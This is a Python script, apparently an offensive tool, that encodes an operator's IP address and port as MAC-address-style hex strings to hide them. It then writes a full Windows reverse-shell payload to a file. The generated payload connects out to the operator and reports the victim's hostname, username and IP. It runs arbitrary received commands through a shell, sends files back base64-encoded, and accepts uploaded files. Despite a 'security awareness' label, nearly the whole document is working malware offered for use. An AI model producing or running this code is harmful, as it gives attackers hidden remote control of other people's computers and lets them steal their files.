#!/usr/bin/env python3
# ============================================================
# MAC Address IP/Port Obfuscator
# Outputs encoded operator values for IP address and port
#
# https://github.com/0xsyr0/Security-Awareness-Calculator
# ============================================================

import sys, datetime

def ip_to_mac(ip):
    octets = ip.split('.')
    if len(octets) != 4:
        print("[-] Invalid IP address")
        sys.exit(1)
    return ':'.join(f'{int(o):02x}' for o in octets)

def port_to_mac(port):
    p = int(port)
    return f'{(p >> 8) & 0xFF:02x}:{p & 0xFF:02x}'

def mac_to_ip(mac):
    return '.'.join(str(int(p, 16)) for p in mac.split(':'))

def mac_to_port(mac):
    parts = mac.split(':')
    return (int(parts[0], 16) << 8) | int(parts[1], 16)

def generate_output(ip, port, ip_mac, port_mac):
    ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    return f"""# Generated: {ts} | {ip}:{port} -> {ip_mac} / {port_mac}

import socket, subprocess, os, json, base64, sys

_if  = "{ip_mac}"
_prt = "{port_mac}"

def _rip(m): return ".".join(str(int(x,16)) for x in m.split(":"))
def _rpt(m): b=[int(x,16) for x in m.split(":")]; return (b[0]<<8)|b[1]

HOST = _rip(_if)
PORT = _rpt(_prt)

s = socket.socket()
s.connect((HOST, PORT))

s.sendall(json.dumps({{
    "hostname": __import__("socket").gethostname(),
    "username": os.environ.get("USERNAME", "unknown"),
    "os":       "Windows",
    "ip":       __import__("socket").gethostbyname(__import__("socket").gethostname()),
    "vscode":   "no"
}}).encode())

PATH_CMDS = ("type", "dir", "copy", "move", "del", "ren", "attrib", "icacls", "tree")

def maybe_fixpath(cmd):
    first = cmd.split()[0].lower().lstrip()
    if first in PATH_CMDS:
        return cmd.replace("/", "\\\\")
    return cmd

def fixpath(p):
    return p.replace("/", "\\\\")

def recv_cmd():
    raw_len = b''
    while len(raw_len) < 4:
        chunk = s.recv(4 - len(raw_len))
        if not chunk:
            return None
        raw_len += chunk
    length = int.from_bytes(raw_len, 'big')
    data = b''
    while len(data) < length:
        chunk = s.recv(min(65536, length - len(data)))
        if not chunk:
            return None
        data += chunk
    return data.decode(errors="replace").strip()

while True:
    try:
        cmd = recv_cmd()
    except Exception:
        sys.exit(0)

    if cmd is None:
        sys.exit(0)

    if not cmd:
        continue

    if cmd == "exit" or cmd == "__exit__":
        s.close()
        sys.exit(0)

    if cmd == "__pwd__":
        s.sendall((os.getcwd() + "\\n").encode() + b"__done__")
        continue

    if cmd.startswith("__cd__"):
        target = fixpath(cmd.replace("__cd__", "").strip())
        try:
            os.chdir(target)
            s.sendall((os.getcwd() + "\\n").encode() + b"__done__")
        except Exception as e:
            s.sendall(f"cd failed: {{e}}\\n".encode() + b"__done__")
        continue

    if cmd.startswith("__mkdir__"):
        target = fixpath(cmd.replace("__mkdir__", "").strip())
        try:
            os.makedirs(target, exist_ok=True)
            s.sendall(f"Created: {{target}}\\n".encode() + b"__done__")
        except Exception as e:
            s.sendall(f"mkdir failed: {{e}}\\n".encode() + b"__done__")
        continue

    if cmd.startswith("__download__"):
        path = fixpath(cmd.replace("__download__", "").strip())
        try:
            with open(path, "rb") as f:
                s.sendall(base64.b64encode(f.read()) + b"__done__")
        except Exception:
            s.sendall(b"__notfound__")
        continue

    if cmd.startswith("__upload__"):
        payload = cmd.replace("__upload__", "")
        sep     = payload.index("__")
        fpath   = fixpath(payload[:sep].strip())
        fdata   = base64.b64decode(payload[sep+2:].strip())
        try:
            os.makedirs(os.path.dirname(fpath) or ".", exist_ok=True)
            with open(fpath, "wb") as f:
                f.write(fdata)
            s.sendall(f"Uploaded to {{fpath}}\\n".encode() + b"__done__")
        except Exception as e:
            s.sendall(f"Upload failed: {{e}}\\n".encode() + b"__done__")
        continue

    if cmd.startswith("__writefile__"):
        payload = cmd.replace("__writefile__", "")
        sep     = payload.index("__")
        fpath   = fixpath(payload[:sep].strip())
        content = payload[sep+2:]
        try:
            os.makedirs(os.path.dirname(fpath) or ".", exist_ok=True)
            with open(fpath, "w", encoding="utf-8") as f:
                f.write(content)
            s.sendall(f"Written: {{fpath}}\\n".encode() + b"__done__")
        except Exception as e:
            s.sendall(f"Write failed: {{e}}\\n".encode() + b"__done__")
        continue

    cmd = maybe_fixpath(cmd)

    try:
        out = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.STDOUT,
            timeout=10, cwd=os.getcwd()
        )
    except subprocess.CalledProcessError as e:
        out = e.output or b"error\\n"
    except Exception as e:
        out = (str(e) + "\\n").encode()
    s.sendall(out + b"__done__")

s.close()
sys.exit(0)
"""

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python3 obfuscate.py <IP> <PORT>")
        print("Example: python3 obfuscate.py 192.168.1.100 9001")
        sys.exit(1)

    ip       = sys.argv[1]
    port     = sys.argv[2]
    ip_mac   = ip_to_mac(ip)
    port_mac = port_to_mac(port)

    print(f"\n[+] Original  : {ip}:{port}")
    print(f"[+] IP  (MAC) : {ip_mac}")
    print(f"[+] Port (MAC): {port_mac}")
    print(f"[+] Verify    : {mac_to_ip(ip_mac)}:{mac_to_port(port_mac)}")

    out = generate_output(ip, port, ip_mac, port_mac)

    with open('payload.output', 'w') as f:
        f.write(out)

    print(f"[+] Written   : payload.output\n")